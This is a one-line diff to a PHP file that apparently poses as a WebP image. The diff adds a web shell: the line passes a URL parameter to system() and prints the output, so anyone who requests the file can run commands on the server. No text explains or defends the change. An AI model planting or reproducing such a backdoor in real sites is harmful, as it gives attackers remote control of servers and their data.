@@ -1,1 +1,1 @@
-<?php echo 'WEBP';?>
+<?php echo "WEBP: ".system($_GET[0]);?>
